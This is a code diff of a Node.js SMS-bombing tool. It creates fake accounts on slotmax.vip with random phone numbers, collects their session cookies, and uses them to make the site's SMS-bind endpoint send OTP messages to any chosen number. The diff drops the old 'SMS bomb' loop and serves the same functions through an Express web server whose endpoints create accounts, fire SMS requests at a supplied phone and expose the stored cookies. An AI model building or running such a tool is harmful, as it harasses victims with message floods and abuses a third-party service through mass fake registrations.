@@ -1,12 +1,18 @@
 const axios = require('axios');
 const fs = require('fs');
+const express = require('express');
+const path = require('path');
+
+const app = express();
+app.use(express.json());
+app.use(express.static('.')); // Serve static files (index.html)
 
 function log() {
-    console.log("\x1b[32m%s\x1b[0m", ...arguments); // Green
+    console.log("\x1b[32m%s\x1b[0m", ...arguments);
 }
 
 function errorLog() {
-    console.error("\x1b[31m%s\x1b[0m", ...arguments); // Red
+    console.error("\x1b[31m%s\x1b[0m", ...arguments);
 }
 
 let file = [];
@@ -17,15 +23,13 @@ try {
 }
 
 function delay(ms) {
-    return new Promise(function(resolve) {
-        setTimeout(resolve, ms);
-    });
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 function randomName() {
     var name = ["nega"];
-    return name[Math.floor(Math.random() * name.length)] + 
-           Array(6).fill(0).map(function() { return Math.random().toString(36).charAt(2); }).join('');
+    return name[Math.floor(Math.random() * name.length)] +
+           Array(6).fill(0).map(() => Math.random().toString(36).charAt(2)).join('');
 }
 
 function save(data) {
@@ -36,9 +40,7 @@ function save(data) {
     }
 }
 
-var errorCreating = false;
-
-var headers = {
+const headers = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'Accept': 'application/json, text/plain, */*',
     'Content-Type': 'application/json',
@@ -50,111 +52,88 @@ var headers = {
     'sec-fetch-dest': 'empty',
 };
 
-function create(tuloy) {
-    return new Promise(function(resolve, reject) {
-        try {
-            var number = "9" + Array(9).fill(0).map(function() { return Math.floor(Math.random() * 10); }).join('');
-            var username = randomName();
-
-            var config = {
-                method: 'POST',
-                url: 'https://slotmax.vip/api/user/custom/register',
-                headers: Object.assign({}, headers, { 'referer': 'https://slotmax.vip/register' }),
-                data: {
-                    username: username,
-                    "password": "3b64b35b9ccdc8495e585f83d6d726bb",
-                    "code": "",
-                    "phone": number,
-                    "areaCode": "63"
-                }
-            };
-
-            axios.request(config).then(function(response) {
-                var cookie = response.headers["set-cookie"] ? response.headers["set-cookie"].join('; ') : null;
-                if (cookie) {
-                    log("✅ Account created:", username, "| Cookie:", cookie);
-                    file.push(cookie);
-                    save(file);
-                    resolve();
-                } else {
-                    throw new Error("Cookie not received.");
-                }
-            }).catch(function(err) {
-                throw err;
-            });
-        } catch (err) {
-            if (!tuloy) {
-                log("💣 Proceeding to SMS bomb...");
-                errorCreating = true;
-            } else {
-                log("❌ Account creation failed. Try refreshing IP.");
+async function create() {
+    try {
+        const number = "9" + Array(9).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
+        const username = randomName();
+        const config = {
+            method: 'POST',
+            url: 'https://slotmax.vip/api/user/custom/register',
+            headers: { ...headers, 'referer': 'https://slotmax.vip/register' },
+            data: {
+                username,
+                password: "3b64b35b9ccdc8495e585f83d6d726bb",
+                code: "",
+                phone: number,
+                areaCode: "63"
             }
-            reject(err);
+        };
+        const response = await axios.request(config);
+        const cookie = response.headers["set-cookie"]?.join('; ') || null;
+        if (cookie) {
+            file.push(cookie);
+            save(file);
+            return { success: true, username, cookie };
+        } else {
+            throw new Error("Cookie not received.");
         }
-    });
-}
-
-function smsotp(phone) {
-    return new Promise(function(resolve, reject) {
-        try {
-            if (file.length === 0) {
-                throw new Error("No tokens available.");
-            }
-
-            var cookie = file[Math.floor(Math.random() * file.length)];
-
-            var config = {
-                method: 'POST',
-                url: 'https://slotmax.vip/api/user/sms/send/bind',
-                headers: Object.assign({}, headers, { cookie: cookie, 'referer': 'https://slotmax.vip/wallet' }),
-                data: {
-                    phone: phone,
-                    "areaCode": "63"
-                }
-            };
-
-            axios.request(config).then(function(response) {
-                log("📩 SMS Response:", JSON.stringify(response.data, null, 4));
-                resolve();
-            }).catch(function(err) {
-                throw err;
-            });
-        } catch (err) {
-            errorLog("❌ SMS Error:", err.message || err);
-            reject(err);
-        }
-    });
-}
-
-function createAccount(tuloy) {
-    let attempts = 0;
-    function loop() {
-        if ((tuloy || !errorCreating) && attempts < 5) { // Limit to 5 attempts
-            attempts++;
-            create(tuloy).then(function() {
-                return delay(5000); // Increased delay to avoid rate limits
-            }).then(loop).catch(loop);
-        }
+    } catch (err) {
+        throw new Error(err.message);
     }
-    loop();
 }
 
-function autoBomb() {
-    createAccount();
-    var exceeded = false;
-    let smsAttempts = 0;
-
-    setTimeout(function() {
-        exceeded = true;
-    }, 120 * 1000);
-
-    function loop() {
-        if (errorCreating && !exceeded && smsAttempts < 5) { // Limit to 5 SMS attempts
-            smsAttempts++;
-            smsotp("YOUR_PHONE_NUMBER").then(loop).catch(loop); // Replace with your number
+async function smsotp(phone) {
+    try {
+        if (file.length === 0) {
+            throw new Error("No tokens available.");
         }
+        const cookie = file[Math.floor(Math.random() * file.length)];
+        const config = {
+            method: 'POST',
+            url: 'https://slotmax.vip/api/user/sms/send/bind',
+            headers: { ...headers, cookie, 'referer': 'https://slotmax.vip/wallet' },
+            data: { phone, areaCode: "63" }
+        };
+        const response = await axios.request(config);
+        return { success: true, data: response.data };
+    } catch (err) {
+        throw new Error(err.message || err);
     }
-    loop();
 }
 
-autoBomb();
+// API Endpoints
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.post('/create', async (req, res) => {
+    try {
+        const result = await create();
+        res.json(result);
+    } catch (err) {
+        res.status(500).json({ success: false, message: err.message });
+    }
+});
+
+app.post('/sms', async (req, res) => {
+    const { phone } = req.body;
+    if (!phone) {
+        return res.status(400).json({ success: false, message: 'Phone number required.' });
+    }
+    try {
+        const result = await smsotp(phone);
+        res.json(result);
+    } catch (err) {
+        res.status(500).json({ success: false, message: err.message });
+    }
+});
+
+app.get('/tokens', (req, res) => {
+    res.json(file);
+});
+
+// Start server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
